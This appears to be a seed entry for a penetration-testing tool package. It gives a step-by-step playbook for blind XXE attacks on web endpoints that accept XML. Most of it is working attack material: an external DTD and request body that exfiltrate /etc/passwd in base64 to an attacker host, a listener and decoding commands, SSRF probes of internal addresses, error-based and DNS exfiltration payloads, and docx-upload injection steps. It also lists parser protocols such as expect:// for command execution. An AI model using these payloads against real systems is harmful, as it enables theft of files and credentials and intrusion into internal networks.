# [Seed] Blind XXE OOB → exfiltrate /etc/passwd and probe the internal network

## Scenario category
Penetration testing / Web exploitation

## Goal summary
A Web endpoint accepts an XML request body (SOAP, docx upload parsing, or a custom API) but does not echo content (blind XXE). Use an external DTD and parameter entities to exfiltrate a target file to an attacker server.

## Full execution path

1. Find injection points.
   - Any Content-Type containing `xml` or `soap`, docx/xlsx/pptx uploads containing XML, or SVG.
   - After injecting a test payload, inspect errors, delay, or an OOB callback.
2. First try a simple XXE with a response.
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
   <r>&x;</r>
   ```
3. If there is no response but OOB works → use an external DTD.
   - Host evil.dtd on your VPS.
   - Trigger server loading and exfiltration.
4. If OOB also fails → test error-based or blind boolean methods.
5. After reading `/etc/passwd`, expand the scope:
   - Scan internal ports (XXE → SSRF).
   - Read application configuration files (database passwords / private keys).
   - Use SSRF to access cloud metadata → see seed-006.

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| Direct SYSTEM `file://` returned an error | The parser disabled ENTITY references | Use nested parameter entities (`%`) | 30min |
| The file contained `<`, `>`, or `&` and broke DTD parsing | XML rules prohibit special characters in parameter entities | Wrap it with base64 through `php://filter` | 40min |
| The OOB server received a callback on port 80 but the payload was malformed | The DTD nesting depth was wrong | Compare the outer and inner layers with the OOB template | 1h |
| File reading returned only half the file | XML limits entity length (`XML_MAX_TOKEN_BYTES`) | Read in segments with offsets | 1h |
| Internal SSRF returned only connection refused | The application's network had no internal services open | Try localhost / 127.0.0.1 / internal service names (K8s) | 30min |
| The Java application was unreachable | The default Java XML parser disabled SYSTEM | Try the `jar:` protocol, or use a SOAP endpoint that may run an older Apache Xerces version | Several hours |

## Toolchain findings

- **XXEinjector** automates XXE exploitation in Ruby.
- **Burp Collaborator** / **interactsh** are required for OOB work.
- **dnslog.cn / oast.online** provide DNS-only OOB services in local and external environments.
- For upload cases, **docx is zip + XML**. Modify `word/document.xml` and compress it again to inject.
- The **payloads-all-the-things** XXE chapter is a full quick reference.

## Key code / commands

Standard two-layer OOB DTD with base64 file exfiltration:

**evil.dtd (hosted on the attacker VPS)**:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com:8000/exfil?d=%file;'>">
%all;
```

**Target request body**:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://attacker.com:8000/evil.dtd">
  %remote;
  %send;
]>
<r>any</r>
```

**Attacker HTTP service for data collection**:

```bash
python3 -m http.server 8000
# Receive GET /exfil?d=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
echo 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=' | base64 -d
# → root:x:0:0:root:/root:/bin/bash
```

XXE → internal SSRF scan:

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://172.16.0.10:8080/admin">]>
<r>&x;</r>
```

Error-based echo: make the XML parser return content in the error message.

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<r>x</r>
```

**docx upload XXE** (many document-processing applications are affected):

```bash
unzip target.docx -d unpacked/
# Edit unpacked/word/document.xml and change the beginning to:
# <?xml version="1.0"?>
# <!DOCTYPE w:document [...XXE payload...]>
zip -r evil.docx unpacked/*
# Upload evil.docx
```

## Improvement suggestions for this package

- Add a full XXE section (OOB / error / blind / docx upload / SVG) to `pentest-tools/references/web-attack-cheatsheet.md`.
- Add interactsh-client to the bootstrap manifest, if it is not already present.
- Routing includes XXE. Add an explicit "XXE OOB exfiltration" route.

## Reusable patterns / script fragments

**XXE decision tree**:

```text
Response available     → send SYSTEM "file://" directly
Error response         → error-based payload (two nested layers + deliberate parse failure)
No response            → standard two-layer OOB DTD (DNS / HTTP)
DNS works, HTTP fails  → DNS exfiltration (encode with base32 and use a subdomain)
```

**XXE protocol list (test by parser)**:

```text
file://          → read local files (most common)
http://, https:// → SSRF
ftp://           → supported by older Java versions
gopher://        → supported by a few PHP parsers
expect://        → command execution when PHP has the expect extension
jar://           → Java decompresses a remote jar file
netdoc://        → file:// alternative for older Java versions
```

**DNS exfiltration (weakest channel)**:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; ext SYSTEM 'http://%file;.attacker.com/x'>">
%eval;
%ext;
<!-- DNS log receives hostname.attacker.com -->
```

## Evolution actions
- [ ] Add a full XXE section to web-attack-cheatsheet.md
- [ ] Check interactsh-client in the bootstrap manifest
- [x] The routing includes an XXE entry

## Environment information
- Attacker VPS (public IP with ports 80/8000/53 open)
- Target: any Web endpoint that accepts XML (PHP/Java/Python lxml/.NET can be affected)
- OOB: interactsh / dnslog.cn / self-hosted DNS

## Redaction requirements
This seed entry is based on public Web exploitation patterns and does not involve a real production target. All domains and IPs are placeholders.
